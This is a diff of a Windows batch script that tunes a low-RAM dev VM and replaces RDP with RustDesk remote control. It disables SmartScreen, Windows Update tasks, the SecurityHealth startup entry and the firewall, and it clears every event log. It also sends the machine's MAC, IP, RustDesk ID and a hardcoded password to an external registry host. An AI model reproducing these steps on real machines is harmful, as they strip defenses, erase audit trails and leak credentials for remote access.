@@ -250,13 +250,14 @@ if exist "%SystemRoot%\UpdateAssistant" (
 )
 
 :: Disable 60+ unnecessary services (low-RAM dev VM)
-:: KEEP for RDP: TermService, UmRdpService, SessionEnv, NcbService, Netman (network), PolicyAgent, IKEEXT
-:: KEEP for system: TokenBroker, InstallService, StorSvc, Dhcp, Dnscache, LanmanWorkstation, NlaSvc, EventLog, RpcSs, RpcEptMapper, CryptSvc, Power, BFE, mpssvc, ProfSvc, gpsvc, Schedule, UserManager, LSM, AudioSrv, AudioEndpointBuilder, Themes
+:: RustDesk-only remote control: RDP services are disabled below.
+:: KEEP for system: StorSvc, Dhcp, Dnscache, LanmanWorkstation, NlaSvc, EventLog, RpcSs, RpcEptMapper, CryptSvc, Power, BFE, mpssvc, ProfSvc, gpsvc, Schedule, UserManager, LSM, AudioSrv, AudioEndpointBuilder, Themes
 :: IMPORTANT: SysMain is KEPT enabled because Windows Memory Compression depends on it.
 :: Superfetch/Prefetch behavior is already disabled via registry (EnablePrefetcher=0, EnableSuperfetch=0).
 :: On 4GB systems, memory compression saves ~30-50% RAM by compressing cold pages.
 for %%S in (
     DiagTrack dmwappushservice diagnosticshub.standardcollector.service
+    TermService UmRdpService SessionEnv
     MapsBroker lfsvc RetailDemo wisvc WerSvc
     XblAuthManager XblGameSave XboxNetApiSvc XboxGipSvc
     RemoteRegistry RemoteAccess SharedAccess TrkWks
@@ -288,13 +289,15 @@ for %%S in (
     BTAGService bthserv BthAvctpSvc
     SharedRealitySvc spectrum
     MicrosoftEdgeElevationService
+    TokenBroker InstallService LicenseManager StateRepository tiledatamodelsvc
+    AppXSvc PushToInstall WpnService WpnUserService_*
+    FontCache
 ) do (
     sc stop %%S >nul 2>&1
     sc config %%S start= disabled >nul 2>&1
 )
 :: NOTE: Some services above may not exist on all SKUs; "sc config" silently fails for absent services.
-:: Critical for RDP NOT in disable list: TermService, UmRdpService, SessionEnv, NcbService, Netman, PolicyAgent, IKEEXT
-:: Critical for graphics/audio/network NOT in disable list: Themes, AudioSrv, AudioEndpointBuilder, Dhcp, Dnscache, LanmanWorkstation, EventLog, RpcSs, mpssvc, BFE, SysMain (for Memory Compression)
+:: Critical for network/system/audio UI NOT in disable list: Dhcp, Dnscache, LanmanWorkstation, EventLog, RpcSs, mpssvc, BFE, SysMain, AudioSrv, AudioEndpointBuilder, Themes
 
 echo   Services disabled + files removed.
 echo   Services disabled + files removed >> "%LOG%"
@@ -363,7 +366,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProf
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v Size /t REG_DWORD /d 3 /f >nul
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v IRPStackSize /t REG_DWORD /d 20 /f >nul
 
-:: Disable Nagle's Algorithm on all interfaces (TCP_NODELAY = instant packet send, crucial for RDP/real-time)
+:: Disable Nagle's Algorithm on all interfaces (TCP_NODELAY = instant packet send, useful for RustDesk/real-time control)
 for /f "tokens=*" %%k in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /k 2^>nul') do (
     reg add "%%k" /v TcpAckFrequency /t REG_DWORD /d 1 /f >nul 2>&1
     reg add "%%k" /v TCPNoDelay /t REG_DWORD /d 1 /f >nul 2>&1
@@ -506,6 +509,32 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Prom
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v GlobalUserDisabled /t REG_DWORD /d 1 /f >nul
 :: LetAppsRunInBackground already set to 2 in line 337 above
 
+:: VM ultra-light profile: no Store/UWP provisioning, no app suggestions, no shell sync noise
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v RemoveWindowsStore /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v DisableStoreApps /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsStore" /v AutoDownload /t REG_DWORD /d 2 /f >nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\PushToInstall" /v DisablePushToInstall /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoInstrumentation /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_TrackDocs /t REG_DWORD /d 0 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_TrackProgs /t REG_DWORD /d 0 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v StartupDelayInMSec /t REG_DWORD /d 0 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v WaitForIdleState /t REG_DWORD /d 0 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v IconsOnly /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v DisablePreviewDesktop /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\CabinetState" /v FullPath /t REG_DWORD /d 1 /f >nul
+
+:: Remove common Run entries that respawn background helpers in cloned VMs
+for %%R in (
+    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+    "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
+) do (
+    reg delete %%R /v OneDrive /f >nul 2>&1
+    reg delete %%R /v Teams /f >nul 2>&1
+    reg delete %%R /v MicrosoftEdgeAutoLaunch /f >nul 2>&1
+    reg delete %%R /v SecurityHealth /f >nul 2>&1
+)
+
 echo   Registry tweaks applied.
 echo   Registry tweaks applied >> "%LOG%"
 
@@ -532,8 +561,16 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Di
 reg add "HKCU\Software\Microsoft\Windows\DWM" /v EnableAeroPeek /t REG_DWORD /d 0 /f >nul
 :: Disable window animation
 reg add "HKCU\Control Panel\Desktop" /v DragFullWindows /t REG_SZ /d 0 /f >nul
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul
+reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 0 /f >nul
+reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f >nul
+reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "0 0 0" /f >nul
 :: Disable cursor blink
 reg add "HKCU\Control Panel\Desktop" /v CursorBlinkRate /t REG_SZ /d -1 /f >nul
+:: Disable Explorer thumbnails/preview handlers for lower RAM and disk churn
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v DisablePreviewPane /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v DisableThumbnailCache /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v IconsOnly /t REG_DWORD /d 1 /f >nul
 :: Dark mode
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 0 /f >nul
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v SystemUsesLightTheme /t REG_DWORD /d 0 /f >nul
@@ -567,6 +604,46 @@ for %%T in (
     "\Microsoft\Windows\Windows Error Reporting\QueueReporting"
     "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask"
     "\Microsoft\Windows\Defrag\ScheduledDefrag"
+    "\Microsoft\Windows\Application Experience\StartupAppTask"
+    "\Microsoft\Windows\Application Experience\PcaPatchDbTask"
+    "\Microsoft\Windows\AppID\SmartScreenSpecific"
+    "\Microsoft\Windows\Chkdsk\ProactiveScan"
+    "\Microsoft\Windows\CloudExperienceHost\CreateObjectTask"
+    "\Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask"
+    "\Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner"
+    "\Microsoft\Windows\Diagnosis\Scheduled"
+    "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+    "\Microsoft\Windows\InstallService\ScanForUpdates"
+    "\Microsoft\Windows\InstallService\ScanForUpdatesAsUser"
+    "\Microsoft\Windows\InstallService\SmartRetry"
+    "\Microsoft\Windows\Maintenance\WinSAT"
+    "\Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser"
+    "\Microsoft\Windows\NetTrace\GatherNetworkInfo"
+    "\Microsoft\Windows\Offline Files\Background Synchronization"
+    "\Microsoft\Windows\Offline Files\Logon Synchronization"
+    "\Microsoft\Windows\PI\Sqm-Tasks"
+    "\Microsoft\Windows\Printing\EduPrintProv"
+    "\Microsoft\Windows\PushToInstall\LoginCheck"
+    "\Microsoft\Windows\PushToInstall\Registration"
+    "\Microsoft\Windows\RetailDemo\CleanupOfflineContent"
+    "\Microsoft\Windows\Shell\IndexerAutomaticMaintenance"
+    "\Microsoft\Windows\StateRepository\MaintenanceTasks"
+    "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan"
+    "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan Static Task"
+    "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker"
+    "\Microsoft\Windows\WDI\ResolutionHost"
+    "\Microsoft\Windows\WindowsUpdate\Scheduled Start"
+    "\Microsoft\Windows\Wininet\CacheTask"
+) do (
+    schtasks /Change /TN %%T /Disable >nul 2>&1
+)
+for %%T in (
+    "MicrosoftEdgeUpdateTaskMachineCore"
+    "MicrosoftEdgeUpdateTaskMachineUA"
+    "GoogleUpdateTaskMachineCore"
+    "GoogleUpdateTaskMachineUA"
+    "Adobe Acrobat Update Task"
+    "OneDrive Standalone Update Task-S-1-5-21"
 ) do (
     schtasks /Change /TN %%T /Disable >nul 2>&1
 )
@@ -605,7 +682,8 @@ echo   - System Restore disabled
 
 :: Clear event logs
 for /f "tokens=*" %%L in ('wevtutil el 2^>nul') do wevtutil cl "%%L" >nul 2>&1
-echo   - Event logs cleared
+for %%L in (Application System Security Setup) do wevtutil sl %%L /ms:1048576 /rt:false /ab:false >nul 2>&1
+echo   - Event logs cleared and capped
 
 :: Disable Notifications Center
 reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f >nul
@@ -689,6 +767,14 @@ del /f /q /s "%SystemRoot%\Prefetch\*" >nul 2>&1
 del /f /q /s "%SystemRoot%\SoftwareDistribution\Download\*" >nul 2>&1
 del /f /q /s "%SystemRoot%\Logs\*" >nul 2>&1
 del /f /q /s "%SystemRoot%\ServiceProfiles\LocalService\AppData\Local\FontCache\*" >nul 2>&1
+del /f /q /s "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
+del /f /q /s "%ProgramData%\Microsoft\Diagnosis\ETLLogs\*" >nul 2>&1
+del /f /q /s "%ProgramData%\USOPrivate\UpdateStore\*" >nul 2>&1
+del /f /q /s "%ProgramData%\USOShared\Logs\*" >nul 2>&1
+if exist "%LOCALAPPDATA%\Microsoft\Windows\INetCache" rmdir /s /q "%LOCALAPPDATA%\Microsoft\Windows\INetCache" >nul 2>&1
+if exist "%LOCALAPPDATA%\Microsoft\Windows\Explorer" del /f /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_*.db" >nul 2>&1
+if exist "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cache" rmdir /s /q "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cache" >nul 2>&1
+if exist "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache" rmdir /s /q "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache" >nul 2>&1
 echo   - Cleaned temp/logs/caches
 
 :: Windows.old (leftover from upgrades)
@@ -721,6 +807,12 @@ if exist "%ProgramData%\Package Cache" (
 )
 if exist "%SystemRoot%\Downloaded Program Files" (
     rmdir /s /q "%SystemRoot%\Downloaded Program Files" >nul 2>&1
+)
+if exist "%ProgramData%\Microsoft\Windows\Caches" (
+    del /f /q /s "%ProgramData%\Microsoft\Windows\Caches\*" >nul 2>&1
+)
+if exist "%ProgramData%\Microsoft\Windows\AppRepository\Packages" (
+    del /f /q /s "%ProgramData%\Microsoft\Windows\AppRepository\Packages\*" >nul 2>&1
 )
 echo   - Cleaned installer caches
 
@@ -830,7 +922,7 @@ bcdedit /timeout 0 >nul 2>&1
 bcdedit /set {globalsettings} custom:16000067 true >nul 2>&1
 bcdedit /set {default} bootuxdisabled on >nul 2>&1
 
-:: NOTE: Firewall will be disabled AFTER RDP rules are configured (PHASE 8)
+:: NOTE: Firewall will be disabled after RustDesk registry/monitoring setup (PHASE 8).
 echo   - Boot tweaks applied
 
 :: ---- MEMORY COMPRESSION TWEAKS ----
@@ -895,265 +987,179 @@ echo   System optimization done.
 echo   System optimization done >> "%LOG%"
 
 :: ============================================================
-:: PHASE 8: ENABLE REMOTE DESKTOP
+:: PHASE 8: VM DASHBOARD REGISTRATION
 :: ============================================================
 echo.
 echo ============================================================
-echo  [10/11] Enabling Remote Desktop...
+echo  [10/11] Registering VM...
 echo ============================================================
-echo [10/11] Enabling Remote Desktop... >> "%LOG%"
+echo [10/11] Registering VM... >> "%LOG%"
 
-:: Enable RDP
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f >nul
-
-:: Ensure firewall is ON temporarily to configure RDP rules
-netsh advfirewall set allprofiles state on >nul 2>&1
-:: Enable RDP firewall rules
-netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes >nul 2>&1
-
-:: ---- Enable ALL RDP-required services ----
-:: TermService = Remote Desktop Services (core RDP listener)
-sc config TermService start= auto >nul 2>&1
-sc start TermService >nul 2>&1
-:: UmRdpService = Remote Desktop Services UserMode Port Redirector (clipboard/drive/device redirection)
-sc config UmRdpService start= auto >nul 2>&1
-sc start UmRdpService >nul 2>&1
-:: SessionEnv = Remote Desktop Configuration (per-session config, MANDATORY for RDP to accept connections)
-sc config SessionEnv start= auto >nul 2>&1
-sc start SessionEnv >nul 2>&1
-:: NcbService = Network Connection Broker (manages network connections for RDP)
-sc config NcbService start= auto >nul 2>&1
-sc start NcbService >nul 2>&1
-:: Netman = Network Connections (required for NIC management, RDP depends on working NIC stack)
-sc config Netman start= demand >nul 2>&1
-:: PolicyAgent = IPsec Policy Agent (network security stack)
-sc config PolicyAgent start= demand >nul 2>&1
-:: IKEEXT = IKE and AuthIP key modules (NLA/network auth)
-sc config IKEEXT start= demand >nul 2>&1
-
-:: ---- RDP Performance (mRemoteNG optimization) ----
-
-:: Color depth 32-bit (best quality for dev work)
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v ColorDepth /t REG_DWORD /d 4 /f >nul
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v ColorDepthPolicy /t REG_DWORD /d 1 /f >nul
-echo   - RDP color depth: 32-bit
-
-:: Enable bitmap caching (reduces bandwidth)
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v AllowBitmapCaching /t REG_DWORD /d 1 /f >nul
-echo   - Bitmap caching enabled
-
-:: Enable RemoteFX hardware GPU encoding
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fEnableRemoteFXAdvancedRemoteApp /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v bEnumerateHWBeforeSW /t REG_DWORD /d 1 /f >nul
-echo   - RemoteFX enabled
-
-:: AVC/H.264 software encoding (no GPU in VM - hardware encode would FAIL and fall back slowly)
-:: AVC444 software mode = smooth video at cost of CPU; perfect for LAN RDP
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v AVC444ModePreferred /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v AVCHardwareEncodePreferred /t REG_DWORD /d 0 /f >nul
-echo   - AVC H.264 software encoding enabled (VM-optimized)
-
-:: ---- UDP transport (HUGE smoothness gain on LAN; TCP-only causes lag) ----
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fClientDisableUDP /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v SelectTransport /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v SelectNetworkDetect /t REG_DWORD /d 1 /f >nul
-:: Open UDP 3389 in firewall
-netsh advfirewall firewall add rule name="RDP-UDP-In" dir=in action=allow protocol=UDP localport=3389 >nul 2>&1
-echo   - UDP transport enabled (port 3389/UDP)
-
-:: ---- Frame rate: 60fps for ultra-smooth mouse/scroll ----
-:: DWMFRAMEINTERVAL is in milliseconds: 15 = 60fps, 33 = 30fps
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v DWMFRAMEINTERVAL /t REG_DWORD /d 15 /f >nul
-:: Frame rate cap for AVC encoder
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxMonitorTargetEffectiveFrameRate /t REG_DWORD /d 60 /f >nul
-echo   - RDP frame rate: 60 FPS
-
-:: ---- Compression: best balance for LAN ----
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v CompressionType /t REG_DWORD /d 2 /f >nul
-echo   - Compression: optimized for bandwidth
-
-:: ---- Image quality (1=Low, 2=Medium, 3=High, 4=Lossless; 3 is best balance) ----
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v VisualExperiencePolicy /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v ImageQuality /t REG_DWORD /d 3 /f >nul
-
-:: Disable wallpaper/theme over RDP (faster rendering)
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fNoRemoteDesktopWallpaper /t REG_DWORD /d 1 /f >nul
-echo   - RDP wallpaper disabled (faster)
-
-:: ---- Keep-alive (prevent disconnects, no idle timeout) ----
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v KeepAliveEnable /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v KeepAliveInterval /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxIdleTime /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxDisconnectionTime /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxConnectionTime /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fInheritMaxIdleTime /t REG_DWORD /d 0 /f >nul
-echo   - No idle/session timeout (never auto-disconnect)
-
-:: Allow multiple simultaneous RDP sessions
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 10 /f >nul
-echo   - Multiple RDP sessions allowed
-
-:: Disable RDP security warning prompts
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v SecurityLayer /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MinEncryptionLevel /t REG_DWORD /d 1 /f >nul
-echo   - RDP security prompts disabled
-
-:: ---- Redirections: disable unused (saves CPU + bandwidth) ----
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCam /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisablePNPRedir /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCpm /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCcm /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableLPT /t REG_DWORD /d 1 /f >nul
-:: fDisableCcm already set above
-:: KEEP clipboard + drive redirect (fDisableClip=0, fDisableCdm=0) - dev needs copy/paste & file transfer
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableClip /t REG_DWORD /d 0 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableCdm /t REG_DWORD /d 0 /f >nul
-echo   - Printer/COM/LPT/Camera redirection OFF; clipboard/drive ON
-
-:: ---- Audio: capture OFF, playback ON quality MEDIUM (saves bandwidth) ----
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDisableAudioCapture /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v fDisableAudioCapture /t REG_DWORD /d 1 /f >nul
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxCompressionLevel /t REG_DWORD /d 1 /f >nul
-echo   - Audio capture disabled, playback compressed
-
-:: ---- Network buffers (smoother on slightly lossy LAN) ----
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fEnableVirtualizedGraphics /t REG_DWORD /d 1 /f >nul
-:: Increase RDP send buffer (faster screen push)
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\TermDD" /v MaxOutstandingSends /t REG_DWORD /d 8 /f >nul
-
-:: Faster screen updates
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxMonitors /t REG_DWORD /d 4 /f >nul
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxXResolution /t REG_DWORD /d 3840 /f >nul
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MaxYResolution /t REG_DWORD /d 2160 /f >nul
-echo   - Max resolution: 4K, 4 monitors
-
-:: ---- Auto-logon next time (avoid login screen lag over RDP) ----
-:: Note: leaves credentials in registry - acceptable for dev VM
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f >nul
-
-:: ---- TCP/UDP optimizations for RDP traffic ----
-:: Enable TCP timestamps (better RTT measurement = smoother UDP fallback)
+:: ---- TCP/UDP optimizations (Improves RustDesk / Network performance) ----
 netsh int tcp set global timestamps=enabled >nul 2>&1
-:: Increase TCP autotuning level (faster screen pushes)
 netsh int tcp set global autotuninglevel=normal >nul 2>&1
-:: Enable RSS (Receive Side Scaling) for multi-CPU virtio NIC
 netsh int tcp set global rss=enabled >nul 2>&1
-:: ECN for less retransmit lag
 netsh int tcp set global ecncapability=enabled >nul 2>&1
-:: Disable TCP Heuristics (stops Windows from dynamically restricting TCP window size)
 netsh int tcp set heuristics disabled >nul 2>&1
-echo   - TCP/UDP tuned for RDP
+echo   - TCP/UDP tuned for remote control
 
 :: ============================================================
-:: DYNAMIC RDP PORT (allocated by central worker - 100%% unique)
+:: VM REGISTRATION (Worker: vm-registry.zewk.workers.dev/register)
 :: ============================================================
-:: Worker: vm-registry.zewk.workers.dev/register
-:: VM gui MAC -> worker tra ve port duy nhat (luu trong KV)
-:: Lan boot lai cua cung VM -> nhan lai dung port cu (idempotent)
-:: Neu worker khong reach duoc -> fallback dung MAC hash
 
 set "VM_REGISTRY_URL=https://vm-registry.zewk.workers.dev"
-set "RDP_PORT=3389"
 
-echo   - Requesting unique RDP port from registry...
-set "PS_PORT=%TEMP%\get_port.ps1"
+echo   - Requesting registration from registry...
+set "PS_REGISTER=%TEMP%\vm_register.ps1"
 (
 echo $ProgressPreference = 'SilentlyContinue'
 echo $nic = Get-CimInstance Win32_NetworkAdapter -Filter 'NetEnabled=True AND PhysicalAdapter=True' ^| Select-Object -First 1
 echo $mac = if ^($nic^) { $nic.MACAddress } else { '' }
 echo $ip = ^(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue ^| Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} ^| Select-Object -First 1^).IPAddress
+echo $hostname = $env:COMPUTERNAME
+echo if ^($hostname -match '^(?i:PCLPCL)'^) { $hostname = 'PCL' + $hostname.Substring^(6^) }
+echo $rd_id = ''
+echo $paths = @("$env:ProgramFiles\RustDesk\config\RustDesk.toml", "$env:ProgramData\RustDesk\config\RustDesk.toml", "$env:LOCALAPPDATA\RustDesk\config\RustDesk.toml", "C:\Windows\System32\config\systemprofile\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Users\PCL\AppData\Roaming\RustDesk\config\RustDesk.toml", "C:\Users\Public\RustDesk\config\RustDesk.toml")
+echo foreach^($p in $paths^) {
+echo     if^(Test-Path $p^) {
+echo         $raw = Get-Content $p -Raw
+echo         $m = $raw -match "id\s*=\s*['""]?([^'""\r\n]+)"
+echo         if^($m^) { $rd_id = $Matches[1].Trim^(^); break }
+echo     }
+echo }
 echo $body = @{
 echo     mac = $mac
-echo     hostname = $env:COMPUTERNAME
+echo     hostname = $hostname
 echo     ip = $ip
+echo     rustdesk = $rd_id
 echo     user = 'PCL'
 echo     password = 'PCL@1231233'
 echo     os = ^(Get-CimInstance Win32_OperatingSystem^).Caption
 echo } ^| ConvertTo-Json
-echo try {
-echo     $r = Invoke-RestMethod -Uri '%VM_REGISTRY_URL%/register' -Method POST -Body $body -ContentType 'application/json' -UseBasicParsing -TimeoutSec 15
-echo     if ^($r.port^) {
-echo         Write-Output $r.port
-echo         exit 0
-echo     }
-echo } catch {}
-echo # Fallback: derive port from MAC hash
-echo if ^($mac^) {
-echo     $last = $mac.Substring^($mac.Length-2^)
-echo     Write-Output ^(13389 + [Convert]::ToInt32^($last,16^)^)
-echo } else { Write-Output 3389 }
-) > "%PS_PORT%"
+echo try { Invoke-RestMethod -Uri '%VM_REGISTRY_URL%/register' -Method POST -Body $body -ContentType 'application/json' -UseBasicParsing -TimeoutSec 15 ^| Out-Null } catch {}
+) > "%PS_REGISTER%"
 
-for /f "usebackq delims=" %%P in (`powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_PORT%" 2^>nul`) do set "RDP_PORT=%%P"
-del /f /q "%PS_PORT%" >nul 2>&1
-if "!RDP_PORT!"=="" set "RDP_PORT=3389"
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_REGISTER%" >nul 2>&1
+del /f /q "%PS_REGISTER%" >nul 2>&1
 
-echo   - Assigned RDP port: !RDP_PORT!
+echo   - VM Registered.
 
-:: Apply port change to RDP listener
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d !RDP_PORT! /f >nul
-
-:: Firewall: remove default RDP rules' port restriction and add new dynamic port (TCP+UDP)
-netsh advfirewall firewall delete rule name="RDP-Custom-Dynamic-TCP" >nul 2>&1
-netsh advfirewall firewall delete rule name="RDP-Custom-Dynamic-UDP" >nul 2>&1
-netsh advfirewall firewall add rule name="RDP-Custom-Dynamic-TCP" dir=in action=allow protocol=TCP localport=!RDP_PORT! profile=any >nul
-netsh advfirewall firewall add rule name="RDP-Custom-Dynamic-UDP" dir=in action=allow protocol=UDP localport=!RDP_PORT! profile=any >nul
-
-:: Now disable firewall (safe behind Hypervisor/Router NAT, RDP rules already applied)
+:: Now disable firewall (safe behind Hypervisor/Router NAT, allows RustDesk)
 netsh advfirewall set allprofiles state off >nul 2>&1
-echo   - Firewall disabled (rules already applied)
+echo   - Firewall disabled
 
-:: Restart ALL RDP services to pick up new port
-sc stop UmRdpService >nul 2>&1
-sc stop SessionEnv >nul 2>&1
-sc stop TermService >nul 2>&1
-timeout /t 2 /nobreak >nul
-sc start TermService >nul 2>&1
-sc start SessionEnv >nul 2>&1
-sc start UmRdpService >nul 2>&1
+echo   VM Registration complete.
+echo   VM Registration complete >> "%LOG%"
 
-:: Verify RDP is actually listening
-echo   - Verifying RDP listener...
-timeout /t 3 /nobreak >nul
-netstat -an | findstr ":!RDP_PORT! " >nul 2>&1
-if !errorlevel! equ 0 (
-    echo   - [OK] RDP confirmed listening on port !RDP_PORT!
-    echo   [OK] RDP confirmed on port !RDP_PORT! >> "%LOG%"
-) else (
-    echo   - [WARN] RDP port !RDP_PORT! not detected yet ^(may start after reboot^)
